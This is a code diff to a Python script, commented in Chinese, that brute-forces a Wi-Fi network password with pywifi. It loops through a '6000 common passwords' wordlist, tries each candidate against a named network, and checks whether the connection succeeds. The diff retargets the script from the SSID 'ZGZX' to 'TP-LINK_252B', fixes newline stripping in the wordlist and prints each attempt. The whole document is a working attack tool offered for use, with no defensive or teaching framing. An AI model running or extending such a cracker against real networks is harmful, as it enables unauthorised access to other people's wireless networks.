@@ -19,7 +19,7 @@ def WifiNet(passwd):
         # 创建wifi链接文件
         profile = pywifi.Profile()
         # 网卡的名称
-        profile.ssid = 'ZGZX'
+        profile.ssid = 'TP-LINK_252B'
         # 网卡的开放
         profile.auth = const.AUTH_ALG_OPEN
         # 设置加密类型
@@ -35,7 +35,7 @@ def WifiNet(passwd):
         # 链接wifi
         iface.connect(profile_new)
         # 测试链接需要时间 所有要睡眠
-        time.sleep(3)
+        time.sleep(5)
         # 判断链接状态 默认为4 const.IFACE_CONNECTED=4
         if iface.status() == const.IFACE_CONNECTED:
             return True
@@ -49,7 +49,8 @@ def WifiPasswd():
     wifipwd = open('6000常用密码字典.txt', 'r')
     # 开始破解wifi
     while True:
-        filepwd = wifipwd.readline()
+        filepwd = wifipwd.readline().strip()
+        print(repr(filepwd))
         filewd = WifiNet(filepwd)
         try:
             if filewd:
@@ -62,5 +63,5 @@ def WifiPasswd():
             # 出现错误就跳出本次循环
             continue
 
-
-WifiPasswd()
+if __name__ == '__main__':
+    WifiPasswd()
